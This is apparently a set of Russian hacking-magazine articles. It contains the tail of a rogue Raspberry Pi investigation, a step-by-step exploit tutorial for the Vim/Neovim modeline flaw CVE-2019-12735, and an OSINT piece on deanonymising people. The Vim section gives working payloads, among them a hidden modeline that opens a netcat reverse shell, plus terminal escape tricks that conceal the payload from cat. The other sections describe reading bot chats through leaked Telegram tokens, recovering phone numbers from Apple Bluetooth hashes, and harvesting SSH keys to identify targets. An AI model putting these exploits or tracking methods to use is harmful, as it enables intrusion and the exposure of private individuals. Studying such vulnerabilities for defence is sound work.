Никто из нас ничего не знал о «малине», так что я спросил других кол лег
из IT — и озадачил их не меньше. Разумеется, я слышал, что некоторые люди
за деньги размещают подобные штуки там, где им не место, — поэтому мне
было очень интересно, чем же на самом деле занима ется эта конкретная.


ЧТО Ж ЭТО ЗА КЛЮЧ?
В поисках разгадки я об ратился к сооб ществу Reddit — и оно меня не под‐
вело. В ключе уверенно опоз нали микропроцессор nRF52832‐MDK — почти
такой же мощный, как сам Raspberry Pi.
   Это серьезное считывающее устройство для Bluetooth, Wi‐Fi и RFID.





          Микропроцессор nRF52832‐MDK в виде USB‐ключа

Он, безо всяких сомнений, должен был дать старенькому Raspberry Pi воз‐
можность подключаться по Wi‐Fi и Bluetooth. Отлично, подумал я, теперь
у этой штуковины еще и вайфай есть…


ПРЕПАРИРУЕМ ОБРАЗ SD-КАРТЫ
На карте оказалось нес колько раз делов. Файловой системой большинства
из них была ext4 (Linux), а у одного (загрузочного) раз дела — FAT16.





                   Об раз карты в GParted

Отлично, самое время их вскрыть.
  Моя дебиановская песочница принес ла первую серьезную подсказку: я
обнаружил установленный Resin.





                  «Резиновые» раз делы на SD‐карте


Что за Resin?
Resin (недавно переименованный в Balena) — это платный веб‐сервис, где
можно генерировать обра зы для устрой ств IOT, развертывать их, получать
и передавать обновле ния и данные.
  А еще Resin устанавливает на девайс VPN — так что можно безопасно
передавать собранные данные. Очевидно, устройство планировали заб‐
рать — ведь если использовать плат ный сервис, это оставляет следы.


Приглядимся к раз делам
Первый раздел называется resin‐boot.





Видишь что‐нибудь цепляющее взгляд? Пра виль но — config.json. Неужто
мы сорвали джекпот?





               Файл conﬁg.json из раздела resin‐boot

Что мы можем вытащить из это го файла.
 1. Приложение, разверну тое на нашем «резиновом» девай се, называется
   logger. Ничего хорошего.
 2. У нас есть username. По всей видимос ти, это имя пользователя от акка‐
   унта Resin, связанного с девайсом.
 3. Подтверждение того, что девайс использует VPN через порт 443.
 4. Дата регистрации. Устройство было зарегистрировано (или развернуто?
   или настроено?) 13 мая 2018 года.


Насчет име ни пользовате ля…
Прогуглив имя из файла config.json, я нашел человека в том же городе, где
была обнаружена «малина». Затем компания про верила свои записи о нем,
но ничего не наш ла.
   Как ни странно, по тому же запросу я нагуг лил еще и сайт 2001 года, где
родители «одаренных детей» пишут статьи о своих чадах и почему‐то под‐
писывают их домашним адресом и номером телефо на. Так я получил име на
и адрес целой семьи.





          Сайт об одаренных детях — не тот самый, но похожий

Зацепка может оказаться ложной, ведь одни и те же име на нередко исполь‐
зуют совершенно разные люди — так что пока прос то его запомним.


resin-data
В директории с данными, собственно, не хра нилось никаких данных (в смыс‐
ле, собранных данных), зато обна ружи лось при ложение на Node.js, сильно
сбившее меня с тол ку — признать ся, я до сих пор не могу четко сказать, чем
оно занималось. Кажется, «раз говаривало» с клю чом через пос ледователь‐
ное соединение, но я так и не смог выяс нить, что за данные оно собирало.
Полагаю, отслеживало движение устройств Bluetooth и Wi‐Fi в зоне действия
(вокруг кабинетов руководс тва, между прочим) и, может быть, перехватывало
необработанные пакеты Wi‐Fi.
  Зато я нашел кое‐что поинтерес ней — файл LICENSE.md.





                    Скриншот фай ла License.md

Странно… Зачем в такой приложухе на Node.js предупреждение о конфиден‐
циальности? Я прогуглил компанию из копирайта — и знаешь что?


ЧУВАК С ИМЕНЕМ ИЗ CONFIG-ФАЙЛА — СОВЛАДЕЛЕЦ КОМПАНИИ
Почему сооснователь компании раскидыва ет эти девайсы по городу — выше
моего понимания, но ладно…


По лучаем домаш ний адрес зло умыш ленников
Другую интересную деталь я нашел в третьем разделе  (resin‐state)
по  адресу  /root‐overlay/etc/NetworkManager/system‐connections/.
Файл назывался resin-wifi-01 — и уга дайте, что в нем было.





А были в нем учетные данные Wi‐Fi, через который настраивали (или тес тили)
устройство. И это определенно не Wi‐Fi нашей конторы. А что мы делаем, ког‐
да хотим найти локацию, связанную с именем конкретного вайфая? Идем
на wigle.net, вводим SSID (то есть имя вайфая) — и получаем координаты.





           Не то имя и не та локация — просто для примера

И что ты думаешь? Это адрес тех самых родителей одаренного ребенка.
Именно отсюда, согласно Wigle.net, настраивали наш девайс.


ПОСЛЕДСТВИЯ
Как и когда «малина» вооб ще к нам попала?
Я проверил логи DNS и выяс нил точное время, когда «малина» впервые
появилась в сети. Следом я проверил логи Radius, чтобы посмотреть, кто
из сотрудни ков находился тог да в помещении, — и увидел кучу сообщений
о том, что к Wi‐Fi пытается подключиться деактивированный аккаунт.
  Деактивированный аккаунт принадлежал бывшему сотруднику — тот (по
некоторым причинам) договорился с руководством, чтобы ему оставили клю‐
чи, пока он не заберет все свои пожитки из офиса (не спрашивай…).


Что теперь?
Теперь в игру вступают юристы — я же сделал свое дело, а остальное
находится за пределами моих компетенции и зарпла ты. Но для меня эта исто‐
рия стала интересным челленджем — и я бла года рен пользователям Reddit,
которые помогли мне с кусочками пазла.
ВЗЛОМ





 УБОЙНЫЙ ТЕКСТ

   ВЫПОЛНЯЕМ ПРОИЗВОЛЬНЫЙ КОД
          В VIM И NEOVIM




Сегодня поговорим об уязвимости в редак‐
торе Vim и его побратиме Neovim. Для ее
эксплуатации не нужно никаких привиле гий,
пользователю  достаточно  открыть  спе‐
циально сфор мирован ный файл, который                aLLy                                                                                    ONsec
выполнит произвольный код на целевой              @iamsecurity
системе.


Vim —  это  бесконечно  кас томизируемая  среда,  которая  подходит
для решения огромного перечня задач. Кто‐то им просто редактирует файлы,
а кто‐то модифицирует, пока не получится IDE для какого‐то из языков прог‐
раммирования. Благодаря такой гибкости Vim остается одним из самых
популярных редакторов. Он предус тановлен на большей час ти современных
дистрибутивов Linux, поэто му уяз вимость в нем потенциально интересна.


             INFO

                       Уязвимость обнаружил Армин Размжоу  (Armin
                        Razmjou) в середине этого года. Ей присвоен
                     номер CVE‐2019‐12735: «уяз вимость выполнения
                      произвольного кода в Vim и Neovim». Под угрозой
                        оказались версии Vim, которые не содержат пат‐
                        ча 8.1.1365, и версии Neovim ниже 0.3.6.


Причина бага в том, что функция source обра баты вает файлы вне защищен‐
ного окружения. Это позволяет злоумышленнику выполнить любые команды,
которые доступны в Vim.


СТЕНД
Для начала поднимем стенд с уязвимыми версиями Vim и Neovim. Будем
использовать контейнер Docker с Debian.


$ docker run ‐‐rm ‐‐hostname vimrce ‐‐name vimrce ‐‐cap‐add=SYS_PT
RACE ‐‐security‐opt seccomp=unconfined ‐it debian /bin/bash

Устанавливаем все необходимые зависимос ти.


$ apt update && apt install ‐y nano build‐essential cmake wget unzip
pkg‐config libtool libtool‐bin gettext git gdb libncurses5‐dev libncu
rsesw5‐dev strace ltrace

Такая портянка нужна, потому что мы будем компилировать дистрибутивы
редакторов из исходников. Ска чиваем уяз вимые версии: для Vim это все, что
ниже версии 8.1.1365, а для Neovim — не выше 0.3.5.


$ cd ~
$ git clone https://github.com/vim/vim.git ‐‐depth=1 ‐‐branch=v8.1.
1364
$ git clone https://github.com/neovim/neovim.git ‐‐depth=1 ‐‐branch=
v0.3.5

Компилим и устанавлива ем Vim. Вклю чаем флаги для добавления отладочной
информации.


$ cd ~/vim
$ sed ‐i 's@#STRIP = /@STRIP = /@' src/Makefile
$ CFLAGS="‐g ‐DDEBUG" ./configure
$ make
$ make install

То же самое проделываем и для Neovim.


$ cd ~/neovim
$ make CMAKE_EXTRA_FLAGS="‐g"
$ make install

Теперь нам нужно создать конфигурационные файлы, в которых надо акти‐
вировать modeline. Для Vim это .vimrc в домашней директории, а для
Neovim — init.vim.


$ echo "set modeline" > ~/.vimrc
$ mkdir ‐p ~/.config/nvim/
$ echo "set modeline" > ~/.config/nvim/init.vim

Стенд готов. Можешь запус тить редакторы и проверить их работоспособ‐
ность.





           Готовый стенд с уяз вимыми версиями Vim и Neovim


             INFO

                       Чтобы выйти из Vim без сохранения результатов
                       редактирования файла, нужно перейти в нор‐
                      мальный режим с помощью Esc и ввести :q!.
                         Ура, ты спасен!





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
     УБОЙНЫЙ ТЕКСТ
               ВЫПОЛНЯЕМ ПРОИЗВОЛЬНЫЙ КОД
                               В VIM И NEOVIM





ДЕТАЛИ УЯЗВИМОСТИ
Для начала давай разберемся, что такое modeline. В Vim существует четыре
основных режима работы: обычный режим, режим вставки, командный режим
и визуальный режим.





             Отоб ражение режима работы редактора Vim

Для перехода в обычный режим нуж но нажать Esc, а с помощью : можно вой‐
ти в командный. В нем ты можешь выполнять команды, встроенные в Vim
или предоставляемые пла гинами. Это могут быть самые разные действия:
настройка среды и рабочих файлов, функции, свя занные с обработкой текста,
команды оболочки и тому подоб ное.
  Не прописы вать коман ды каждый раз вручную и нас троить среду Vim
под свои нужды помогает файл .vimrc. По ана логии с .bashrc он выпол няет‐
ся каждый раз при запуске Vim. Если такой файл находится в корневом
каталоге текущего пользователя, то он будет загружен автоматически.
   Это все, конечно, удоб но, но что, если нужно пере опре делить какие‐то
настройки для конкретного типа файлов или вообще в пре делах одного
документа? Тут на помощь и приходит modeline. Этот режим поз воляет опре‐
делить в открываемом файле опции его редактирования. Настройки зада‐
ются напрямую в файле, по дефолту интерпретиру ется первая и пос ледняя
строка. Если они соот ветству ют шаб лону, то Vim выполняет их.
  В некоторых современных дистрибути вах  Linux  этот режим включен
по умолчанию. Если версия твоего редактора в зоне риска, то набери коман‐
ду :set modeline?. Увидишь в ответ nomodeline — считай, что ты в безопас‐
ности и уязвимость на тебя не рас простра няется.
  Существует два фор мата указания опций в modeline. Первый — короткий.


[любой_текст]{пробел_или_таб}{vi:|vim:|ex:}[пробел_или_таб]{опции}

В качестве опций указывается список необходимых настроек, разделенных
пробелом или двоеточием. Каждая часть перед символом двоеточия —
это аргумент для :set. Нап ример, часто задают кас томную ширину строки,
размер табуляции и замену табов на про белы.


vim:tw=80 ts=4 et

Второй формат — расширенный.


[любой_текст]{пробел_или_таб}{vi:|vim:|ex:}[пробел_или_таб]se[t] {
опции}:[любой_текст]

В этом формате те же самые опции будут выглядеть сле дующим образом:


/* vim: set textwidth=80 tabstop=4 expandtab: */

Разумеется, в целях безопасности в modeline можно использовать не все
настройки.





         Не все опции доступны для изменения через modeline

Например, попробуем поменять кодировку, в которой работает редактор.
За это отвечает опция enc.


/* vim: set enc=foo: */





         Опция enc недос тупна для изменения через modeline


/src/option.c
4544:       /* Disallow changing some options from modelines. */
4545:       if (opt_flags & OPT_MODELINE)
4546:       {
4547:       if (flags & (P_SECURE | P_NO_ML))
4548:       {
4549:           errmsg = _("E520: Not allowed in a modeline");
4550:           goto skip;
4551:       }

Помимо обычных опций, допус кается использование выражений.


/* vim: set fdm=expr fde=getline(v\:lnum)=~'{'?'>1'\:'1': */

Все выраже ния выполняются в режиме песочницы (sandbox).





          Выражения из modeline выполняются в песочнице

В ней допускает ся применение только простейших «безопасных операций».
  Обратимся к сорцам. Проверя ет, мож но ли запустить выражение в песоч‐
нице, функция check_secure.


/src/ex_cmds.c
4802:     int
4803: check_secure(void)
4804: {
4805:     if (secure)
4806:     {
4807:   secure = 2;
4808:   emsg(_(e_curdir));
4809:   return TRUE;
4810:     }
4811: #ifdef HAVE_SANDBOX
4812:     /*
4813:      * In the sandbox more things are not allowed, including
the things
4814:      * disallowed in secure mode.
4815:      */
4816:     if (sandbox != 0)
4817:     {
4818:   emsg(_(e_sandbox));
4819:   return TRUE;
4820:     }
4821: #endif
4822:     return FALSE;
4823: }

Если пробежаться по исходникам, то можно заметить, что функция source
разрешена для запуска через modeline и она работа ет не в песочнице. Эта
функция очень ненадежна с точки зрения безопас ности, так как выполняет
команды Vim из указанного файла.





                   Описание команды source


/src/ex_cmds2.c
3214: /*
3215:  * ":source {fname}"
3216:  */
3217:     void
3218: ex_source(exarg_T *eap)
3219: {
...
3236:   cmd_source(eap‐>arg, eap);
3237: }
...
3240: cmd_source(char_u *fname, exarg_T *eap)
3241: {
...
3245:     else if (eap != NULL && eap‐>forceit)
3246:   /* ":source!": read Normal mode commands
3247:    * Need to execute the commands directly.  This is required
at least
3248:    * for:
3249:    * ‐ ":g" command busy
3250:    * ‐ after ":argdo", ":windo" or ":bufdo"
3251:    * ‐ another command follows
3252:    * ‐ inside a loop
3253:    */
3254:   openscript(fname, global_busy || listcmd_busy || eap‐>nextcmd
 != NULL
3255: #ifdef FEAT_EVAL
3256:                        || eap‐>cstack‐>cs_idx >= 0
3257: #endif
3258:                        );

Когда после source указан модификатор !, команды из файла выполняются,
как если бы мы их вводили в нормальном режиме. За это поведение отве чает
флаг forceit (eap‐>forceit).





               Выполнение команды source! в Vim

Создадим файл с пейлоадом.


poc
:!uname ‐a

Чтобы вызвать его через modeline, в первую очередь нам нужно най ти фун‐
кцию, которая принимает выражения. В Vim, как и в большинстве IDE, есть
возможность  сво рачивать  участки  кода  (folding).  Например,  если  ты
не хочешь видеть тело функций при открытии фай ла, то устанавливаешь
метод indent в foldmethod, и все строки, которые содержат отступы, будут
свернуты.


hello.c
1: /* vim: set foldmethod=indent: */
2: #include <iostream>
3: using namespace std;
4: int main()
5: {
6:     cout << "Hello, World!";
7:     return 0;
8: }





     Сворачивание строк с отсту пами. foldmethod установлен в indent

В Vim можно кастомизировать любой чих, и сворачи вание — это не исклю‐
чение. Ты можешь указать свою функцию свертывания, которая будет при‐
водить документ к жела емому виду. Возь мем на вооружение эти функции
для того, чтобы вызвать команду source и выпол нить наш пейлоад.
  Для начала нужно вклю чить режим свертывания (на случай, если он был
отключен в .vimrce). Это можно сделать, используя команду foldenable.


/* vim: set foldenable: */

Затем в foldmethod указываем тип свертывания. Нам нужен expr.


/* vim: set foldenable foldmethod=expr: */

Теперь в foldexpr нужно задать выражение, которое будет выполнено для сво‐
рачивания строк. Здесь воспользуем ся функци ями, которые при нимают
команды, — assert_beeps и assert_fails отлично подойдут.


/* vim: set foldenable foldmethod=expr foldexpr=assert_beeps(): */





  Некоторые функции, принимающие в качестве аргументов команды Vim


/src/eval.c
9691: assert_beeps(typval_T *argvars)
9692: {
...
9700:     do_cmdline_cmd(cmd);
...
9732: assert_fails(typval_T *argvars)
9733: {
...
9741:     do_cmdline_cmd(cmd);


/src/eval.c
590: do_cmdline_cmd(char_u *cmd)
591: {
592:     return do_cmdline(cmd, NULL, NULL,
593:                   DOCMD_VERBOSE|DOCMD_NOWAIT|DOCMD_KEYTYPED);
594: }

В теле assert_beeps уже можно парсить наш файл с пейлоадом при помощи
команды source.


/* vim: set foldenable foldmethod=expr foldexpr=assert_beeps('source\
!\ poc'): */

Здесь не забываем про экранирование пробелов, так как это разделитель
команд, и остальных спец символов. Оста лось указать уровень свертывания
по умолчанию и текст, который отобража ется, ког да код свернут. Это можно
сделать при помощи опций foldlevel и foldtext соот ветственно.


/* vim: set foldenable foldmethod=expr foldexpr=assert_beeps('source\
!\ poc') foldlevel=0 foldtext=: */

Теперь добавим получившуюся строку в файл и откроем его в Vim. Я сделал
это через отладчик и пос тавил бряк на функцию cmd_source.





          Вызов команды source через modeline в отладчике

В результате GDB показывает нам, что пос ле открытия файла вызывается
файл poc и пейлоад отрабатывает: на экра не видим результат выполнения
uname ‐a.





        Результат выполнения пейлоада при откры тии файла в Vim

Тот же результат получим при использовании вто рой (сокращенной) формы
вызова modeline.


// vi:fen:fdm=expr:fde=assert_beeps('source\!\ poc'):fdl=0:fdt=

На этом этапе для успешной экс плуатации нуж но два файла — один с пей‐
лоадом, а второй для его вызова, что, сам понимаешь, не очень удобно.
Исправить дело нам поможет регистр % — он указыва ет на текущий файл.


:reg %





                 Содержимое регис тра % в Vim

То есть команда :source! % откро ет этот же файл и выполнит команды,
которые в нем указаны.





            Использование регистра % в команде source

Таким образом, наш экс плоит примет следующий вид:


// vi:fen:fdm=expr:fde=assert_beeps('source\!\ \%'):fdl=0:fdt=

Теперь надо записать в этот же файл команды, которые нужно выполнить, то
есть сделать пейлоад плюс экс плоит — два в одном. В самом начале файла
указываем, что хотим выполнить:


:!uname ‐a

Все, что идет после команды, тоже будет выполнено, поэтому с помощью ||
укажем любую команду, которая не будет отсвечивать, например true.


:!uname ‐a||true

Дальше нужно вставить modeline. Чтобы не сломать командную строку, возь‐
мем ее в кавычки.


:!uname ‐a||true " vi:fen:fdm=expr:fde=assert_beeps('source\!\ \%'):
fdl=0:fdt= "

Можно и просто использовать одни лишь кавычки, без true, только в таком
случае нужно быть уверенным, что первая команда отработает успешно, ина‐
че в командную строку улетит содержимое скобок и ты получишь мусор —
ответ от шелла «Команда не найдена».





   Мусор в командной строке после некорректно отработавшей команды

В результате и shell‐команда получилась верная, и modeline корректный.


poc
1: :!uname ‐a||true " vi:fen:fdm=expr:fde=assert_beeps('source\!\ \
%'):fdl=0:fdt= "

Открываем полученный файл в Vim, и команда выполняется.





     Успешная эксплуата ция выполнения команд в Vim через modeline

Вместо source также можно исполь зовать ее сокращенную версию so.


poc
1: :!uname ‐a||true " vi:fen:fdm=expr:fde=assert_beeps('so\!\ \%'):
fdl=0:fdt= "

Конечно же, после того как команда отра бота ет, выполнение вернется
в редактор и пользователь увидит наш пейлоад. Это можно поправить,
используя магию управляющих последова тельнос тей в терминале. Двух‐
символьные управляющие пос ледовательности начинаются с символа ESC
(0x1B), а если последова тельность содержит более двух символов, то добав‐
ляется еще и символ [ (0x5B). Такие конс трук ции также называются escape‐
последовательностями, так как они начинаются с символа ESC.
   Разберем один из экспло итов с GitHub за авторством Arminius.





                 Исходный код эксплоита для Vim

В начале файла идут две управляющие пос ледователь ности:
 • Esc[?7l (1b 5b 3f 37 6c);
 • EscS (1b 53).

Первая отклю чает автоматический перенос строк (auto‐wrap mode), чтобы
дальнейшие действия пра виль но отра бота ли. Вторая пос ледовательность
отработает в Vim. Это команда для удаления текущей строки и вход в режим
редактирования содержимого (Insert).





         Первые две эскейп‐последовательности в эксплоите

Затем идет строка Nothing here., которая вво дится в качестве текста фай‐
ла, и после нее — кнопка Esc (1b), то есть выходим из режима Insert в режим
Normal. Далее идет пачка внутренних команд Vim.


silent! w | call system('nohup nc 127.0.0.1 9999 ‐e /bin/sh &') |
redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails(
'set\ fde=x\ \|\ source\!\ \%') fdl=0:

Модификатор silent! перед командой подавляет любой ее вывод, даже
если это ошибка.
 • w записывает изменения в текущий файл;
 • call выполняет вызов функции; в нашем случае это system, которая
   исполняет shell‐команду. Здесь это бэкконнект через netcat;
 • redraw! обновляет содержимое экра на, предварительно очистив его
  (модификатор ! );
 • file выводит информацию о текущем фай ле: имя, позицию курсора, ста‐
   тус файла и тому подобное. Не совсем понятно, зачем это нужно, можно
   выкинуть.

В конце еще один модификатор silent!, нужный для того, чтобы остаток
файла был интерпретирован как команда. Ошиб ка (несущес твующая конс‐
трукция) будет подавлена.
  После этого идет уже знакомый нам пей лоад для откры тия текущего фай‐
ла. Затем идут эскейп‐последова тельности, которые скрывают содержимое
файла от терминальных читалок типа cat.
 • 16 — аналог сочетания Ctrl‐V для входа в режим ввода raw, где введенные
  символы не интерпретиру ются драйвером терминала;
 • Esc[1G (1B 5B 31 47) — двигаем курсор на нужную позицию. Она указыва‐
   ется числом перед сим волом G , здесь 1 — на начало текущей строки.
  По умолчанию как раз эта позиция и сто ит, поэто му единицу можно не ука‐
   зывать;
 • 16 — снова входим в режим raw;
 • Esc[K (1B 5B 4B) — стираем содержимое строки, начиная с указанной
   позиции. Если не ука зано число до символа K , то счи тается, что оно равно
   нулю, и удаляется до кон ца строки;
 • Nothing here. — текст, который будет выводиться в терминал;
 • 16 — снова входим в режим raw;
 • Esc[D (1B 5B 44) — воз вра щаем курсор на предыдущую позицию.

Благодаря этой конструкции при прос мотре, например при помощи cat, ты
не будешь видеть реальное содержимое файла.





  Скрытие содержимого экс пло ита с помощью escape‐последовательнос‐
  тей в терминале

Конечно же, этот трюк работает только для баналь ного скрытия пейлоада.
Просто открыв файл через nano или cat с флагом ‐v, легко обойти эту тех‐
нику.


cat ‐v shell.txt





                 Раскрываем содержимое экс плоита

В Neovim этот экспло ит тоже работа ет. Плюс в этой версии редактора име‐
ется функция nvim_input, которая также уяз вима.


#  vi:fen:fdm=expr:fde=nvim_input("\:terminal\ uname\ ‐a\\n"):fdl=0

Чтобы каждый раз не возиться с редактированием пейлоадов для тестирова‐
ния,  можешь  попробовать  воспользоваться,  например,  ге нератором,
который написал mikaelkall. В качестве параметров нужно будет указать адрес
бэкконнекта, имя файла и опционально его содержимое.


build.py <lhost> <lport> <filename> [content]




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
     УБОЙНЫЙ ТЕКСТ
               ВЫПОЛНЯЕМ ПРОИЗВОЛЬНЫЙ КОД
                               В VIM И NEOVIM





ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОД
Эта уязвимость еще раз доказывает, что не стоит бездумно открывать неиз‐
вестные файлы даже в обычных редакторах. Их функции не только упрощают
жизнь пользователям, но и соз дают дополнительные векторы для атак.
   Разработчики Vim и Neovim оперативно выпус тили патчи для устранения
найденных уязвимостей. Эти патчи уже входят в пос ледние версии популяр‐
ных дистрибутивов Linux. Патч под номером 8.1.1365 для Vim добавляет про‐
верку check_secure в функцию openscript, и теперь песочница не даст без‐
наказанно вытворять что взду мается. Если ста вить заплатку ты не хочешь, то
отключи использование modeline. Для этого нужно добавить в файл .vimrc
такую строчку:


set nomodeline

Ну и конечно, почаще обновляй ОС и софт и не доверяй файлам, которые
пришли из неизвестных источников. Даже если они прос то текстовые.
ПРИВАТНОСТЬ





             soxoj
    Киберразведчик‐любитель.
       OSINT, нетсталкинг,
           антифрод.
      soxoj@protonmail.com





 РАЗБИРАЕМ
 СОВРЕМЕННЫЕ     БОЕВОЙ
 МЕТОДЫ
 СЕТЕВОЙ
 РАЗВЕДКИ        OSINT




Что объединяет конкурентную разведку, пен тестинг и рас‐
следование  киберинцидентов?  Это  сбор  информации,
и прежде всего — из открытых источников. Но что делать,
если найденных сведений не хватает, а привычные инстру‐
менты уже бессильны? Поговорим о хаках и приемах, тесно
связанных с получением доступа к закрытым материалам.


По словам представителей американской разведки, около восьмидеся ти
процентов полезной информа ции приходит из общедос тупных источников.
И лишь небольшая часть — это раз ведданные, добытые непос редственно
агентурой. Разница огромна, но нельзя забывать, что именно полученные
разведкой детали позволяют подтвердить и верифицировать общую картину.
   Это хорошо иллюстрирует история о том, как в ЦРУ в советское время
восстановили на основе фотографии из журнала схему электрификации Ура‐
ла и предприятий ядерной про мышленнос ти. Аналитики разведки зацепились
за одно заретушированное изображение панели мониторинга, а потом про‐
делали огромную работу, собирая данные из советских газет, журналов
и отчетов дипмиссий. Но реша ющими ока зались снимки местности с раз‐
ведывательных аэростатов, потому что иначе невоз можно было подтвердить
правомерность выводов о рас положении линий энергопередач и заводов.





Не менее важно уметь дос тать «разведданные», когда речь заходит про сбор
информации о людях. Это может быть рас следова ние заражения и поиск
виновника или идентификация личности для уточнения поверхности атаки.
Далее рассмотрим неординарные случаи получения информации тогда, ког‐
да сбор из открытых источников не дает нужного результата.


ПРОБИВАЕМ БОТА TELEGRAM
Как ты знаешь, у Telegram широкая функциональ ность для работы с ботами.
Ничего не стоит создать нового, получить токен для управле ния и исполь‐
зовать в готовом скрип те с GitHub. Так же легко токены от ботов и утекают:
найти их можно по элементарным доркам. А иногда в руки просто попадается
мал варь, которая использует функции Telegram как пульт управления, —
знал бы ты, сколько архивов стиллеров хра нится в облаке мессенджера!
   Что останавливает от вытаскивания всей информа ции бота через утекший
токен? Конечно, это API Telegram, в котором ограничиваются множественные
подклю чения для ботов из раз ных мест. А даже если бот не работает или его
владелец проигнорирует ошибки подключения, то мы все равно сможем
получать только новые, не обработанные ранее сообщения. Наконец, бот
не обладает знанием о том, с кем он общался в прошлом. Таким образом,
прочитать историю не получится — нужно тихо ждать, пока кто‐то напишет,
чтобы перехватить сооб щение.
  К счастью, HTTP API для работы с ботами — это только надстройка
над оригинальным MTProto  API, который поз воляет  взаимодей ствовать
с ними, как с челове чес кими акка унтами. А для работы с этим протоколом уже
есть готовые библиотеки! Лично я советую Telethon, в котором не так давно
была реализована прослойка для управления ботами.
   Как ты понимаешь, воз можнос ти при таком способе увеличиваются
на порядок. Теперь мы можем подключиться незаметно для владельца бота
и вытащить историю сообщений. А первый диалог, оче вид но, будет с его
хозяином. Я написал простой скрипт, который тащит переписки, сохраняет
медиаконтент, имена и фотографии собеседников.
  И кстати, ты наверняка помнишь, что недавно в Telegram добавили фун‐
кцию удаления своих сооб щений у собеседника. Так вот, если удалить сооб‐
щение из диалога с ботом, то у него оно останется.


УЗНАЕМ НОМЕР ТЕЛЕФОНА В НОЛЬ КАСАНИЙ
Представь, что тебе нужно узнать номер телефона, лежащего в кармане дру‐
гого челове ка. И при этом не привлекать вни мания! Конечно, для этого есть
масса способов, начиная от брутального перехвата через IMSI catcher
и заканчивая социальной инженерией. А до 2018 года Wi‐Fi в московском
метро легко отдавал по MAC номер телефона и рекламный профиль его вла‐
дельца.
  Иссле дователи из Hexway недавно опубликовали информацию о том,
как устройства Apple об щаются между собой через Bluetooth LE. Для вза‐
имной идентификации они используют хеши от данных аккаунта человека: три
байта от SHA‐256 номера телефона, Apple ID и почтового ящика. Да‐да,
айфоны, макбуки и даже наушники буквально кричат в радиоэфир вокруг, кто
они и в каком режиме работы находятся.
  К счастью, хеши отсылаются не всегда, а только в конкретных слу чаях: нап‐
ример, при открытии экранов ввода пароля от беспроводной сети. Но этого
достаточно: предложи человеку подключиться к Wi‐Fi — и хеши от его данных
у тебя.
  Кроме того, вспомним, что рос сийский номер сос тоит из одиннадцати
цифр и по трем байтам фактичес ки будет лишь нес колько десятков коллизий.
И даже еще меньше, если мы точно зна ем регион и опе ратора. Авторы
исследования сделали удобный скрипт, который поз воляет сгенерировать
хеши по нужным диапа зонам. Отдельные энтузиасты уже создали готовую
базу, вычистив несуществу ющие коды операторов. Так что пос ле получения
списка  номеров  остается  только  сузить  количество  «подозреваемых»
с помощью запросов HLR для про бива активнос ти абонента и проверки
наличия у него аккаунтов мес сенджеров. Пара итераций — и у тебя в руках
номер нужного мобильника.
   Также не сто ит забывать об Apple ID и почтовом ящике! Теперь у тебя есть
все данные для проверки информа ции об аккаунтах человека, которую ты
найдешь в открытых источниках.


ПОИСК EMAIL ЧЕРЕЗ СЕТЕВОЙ ХАНИПОТ
А теперь предположим, что мы находимся в противоположной ситуации:
можем контактировать с человеком только через сеть, например мессенджер
Jabber. Мы знаем, что он занимается разработкой малвари, но ведет двойную
жизнь и имеет официальную работу. Нам бы очень хотелось выяс нить его
личность, но использует он исклю чительно Tor и VPN. За что мы можем
зацепиться в этом случае?
   Как у каждого человека есть характерный почерк, так и код раз ных людей
часто различается в мелких деталях. Что, если у нас на руках скрипт от объ‐
екта поиска? Да, мы можем поискать по клю чевым строкам в открытых
репозиториях в надежде на то, что и в нас тоящей жизни он где‐то писал
или повторно использовал свой код. Таким образом мы выйдем на аккаунт,
скачаем из него все дос тупные репози тории и получим спи сок людей и поч‐
товых адресов с помощью прос той команды


$ git log —pretty="%an %ae%n%cn %ce" | sort | uniq

Знал бы ты, как часто люди по невнимательнос ти делают коммит под одним
аккаунтом, а пушат под другим!
  Но поиск таким методом выходит неточный, да и наверняка есть дру гие
способы. Что может выдать активно го пользователя репозитория Git? Даю
наводку: публичный ключ, через который тебя идентифицирует сервер! Часто
это тот же ключ SSH, который генерируется в id_rsa, но двойная жизнь пред‐
полагает  несколько  личностей  и  нес колько  аккаунтов. И  наверняка
какой‐нибудь используется для подклю чения к серверам. Понимаешь, к чему
я клоню?
  Для полноты картины уточним еще две вещи. Первая: все публичные ключи
пользователей GitHub и GitLab хра нятся в откры том виде и общем доступе,
достаточно добавить .keys к URL твоего профиля. Вторая: клиент SSH
при подключении перебирает все клю чи, которые явно указаны для сервера
либо добавлены в агент. Здесь и кроется вся суть нашей авантюры.
  Мы даем человеку подключиться к нашему серверу с запатченным SSH,
который отсылает нам все ключи. А затем ищем его по базе всех пользовате‐
лей открытых репозиториев! Идея прос та и гени аль на и уже в каком‐то виде
реализована. Набери в консоли


$ ssh whoami.filippo.io

Cервер попытается найти твой GitHub, а заодно проверит на CVE‐2016‐0777.
  Код сервера открыт, а в его основе — база для исследования надежности
клю чей пользователей GitHub. Сами данные не публиковались, но другие
люди впоследствии повторяли сбор самостоятельно. Впрочем, напомню, что
актуальные пользовательские данные лучше собирать самому: аккаунты
переименовывают, создают новые, а некоторые даже меняют пароли.


СКЕЛЕТЫ В ШКАФУ TELEGRAM
Как часто тебе приходилось пытать ся выяс нить информацию об аккаунте
в Telegram? Мне так слишком, слишком час то. Иног да происхождение про‐
ясняет  метаинформация  вроде  юзерней ма  (когда  он  похож  на  имя
и фамилию реального человека) или фотографии из аккаунта и дата их уста‐
новки. Но порой и этой информа ции нет, только First и Last name, абсолютно
неинформативные.
   Вот как выглядит уста новление личности при реальных поисках. Во‐пер‐
вых, прежде все го выяс няем идентификатор аккаунта. В официальных кли‐
ентах он скрыт, но некоторые неофициальные отоб ражают ID при откры тии
профиля. Удобнее перес лать сообщение от человека боту @userinfobot,
и тот выдаст заветные цифры.
  Впрочем, иногда метод может и не сработать из‐за настроек при ватности
аккаунта. Но есть выход: через скрипты можно использовать API для отсле‐
живания системных полей в сообщениях и событиях. Впоследствии мы иден‐
тифицируем человека, если он сменит имя, уйдет из общих чатов или на вре‐
мя потеряется.
  Далее ищем данные по специальным поисковикам. Для Telegram полез нее
всего будет search.buzz.im, который индексирует все откры тые чаты. Он даже
позволяет искать по автору сообщения! Но для нас это будет бесполезно,
если владелец аккаунта недавно сменил имя. Большого везения требует
поиск по ID — теоре тически он мог промелькнуть текстом в откры тых чатах
и проиндексироваться, но на практике такая веро ятность низка.





